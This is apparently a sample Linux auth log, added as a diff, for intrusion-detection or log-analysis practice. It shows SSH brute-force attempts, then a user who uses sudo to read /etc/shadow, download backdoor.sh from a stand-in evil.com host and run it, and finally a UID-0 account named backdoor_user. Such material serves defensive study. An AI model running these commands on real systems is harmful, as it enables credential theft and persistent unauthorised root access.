@@ -1,0 +1,46 @@
+Mar  4 03:14:22 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:25 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:28 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:31 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:34 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:37 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:40 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:43 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:46 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:49 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:52 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:55 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:14:58 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:15:01 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:15:04 server01 sshd[12401]: Failed password for root from 185.22.91.44 port 44322 ssh2
+Mar  4 03:15:09 server01 sshd[12402]: Failed password for admin from 185.22.91.44 port 44350 ssh2
+Mar  4 03:15:12 server01 sshd[12402]: Failed password for admin from 185.22.91.44 port 44350 ssh2
+Mar  4 03:15:15 server01 sshd[12402]: Failed password for admin from 185.22.91.44 port 44350 ssh2
+Mar  4 03:15:18 server01 sshd[12402]: Failed password for admin from 185.22.91.44 port 44350 ssh2
+Mar  4 03:15:21 server01 sshd[12402]: Failed password for admin from 185.22.91.44 port 44350 ssh2
+Mar  4 03:17:44 server01 sshd[12410]: Failed password for invalid user test from 103.45.67.89 port 55201 ssh2
+Mar  4 03:17:47 server01 sshd[12410]: Failed password for invalid user guest from 103.45.67.89 port 55202 ssh2
+Mar  4 03:17:50 server01 sshd[12410]: Failed password for invalid user oracle from 103.45.67.89 port 55203 ssh2
+Mar  4 03:17:53 server01 sshd[12410]: Failed password for invalid user postgres from 103.45.67.89 port 55204 ssh2
+Mar  4 03:17:56 server01 sshd[12410]: Failed password for invalid user mysql from 103.45.67.89 port 55205 ssh2
+Mar  4 03:18:00 server01 sshd[12410]: Failed password for invalid user deploy from 103.45.67.89 port 55206 ssh2
+Mar  4 03:18:03 server01 sshd[12410]: Failed password for invalid user jenkins from 103.45.67.89 port 55207 ssh2
+Mar  4 03:18:06 server01 sshd[12410]: Failed password for invalid user git from 103.45.67.89 port 55208 ssh2
+Mar  4 03:20:11 server01 sshd[12500]: Accepted password for developer from 10.0.1.55 port 60122 ssh2
+Mar  4 03:20:12 server01 sshd[12500]: pam_unix(sshd:session): session opened for user developer(uid=1001) by (uid=0)
+Mar  4 03:25:30 server01 sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Mar  4 03:25:35 server01 sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/wget http://malicious-payload.evil.com/backdoor.sh
+Mar  4 03:25:40 server01 sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/chmod +x /tmp/backdoor.sh
+Mar  4 03:25:45 server01 sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/tmp/backdoor.sh
+Mar  4 04:01:15 server01 sshd[12600]: Accepted publickey for sysadmin from 10.0.1.10 port 61000 ssh2
+Mar  4 04:01:16 server01 sshd[12600]: pam_unix(sshd:session): session opened for user sysadmin(uid=1000) by (uid=0)
+Mar  4 04:10:22 server01 sshd[12700]: Failed password for root from 45.33.22.11 port 33102 ssh2
+Mar  4 04:10:25 server01 sshd[12700]: Failed password for root from 45.33.22.11 port 33102 ssh2
+Mar  4 04:10:28 server01 sshd[12700]: Failed password for root from 45.33.22.11 port 33102 ssh2
+Mar  4 04:10:31 server01 sshd[12700]: Failed password for root from 45.33.22.11 port 33102 ssh2
+Mar  4 04:10:34 server01 sshd[12700]: Failed password for root from 45.33.22.11 port 33102 ssh2
+Mar  4 05:00:00 server01 sshd[12800]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=91.134.55.77 user=root
+Mar  4 05:00:03 server01 sshd[12800]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=91.134.55.77 user=root
+Mar  4 05:00:06 server01 sshd[12800]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=91.134.55.77 user=root
+Mar  4 06:30:00 server01 useradd[13000]: new user: name=backdoor_user, UID=0, GID=0, home=/root, shell=/bin/bash
+Mar  4 06:30:05 server01 passwd[13001]: pam_unix(passwd:chauthtok): password changed for backdoor_user
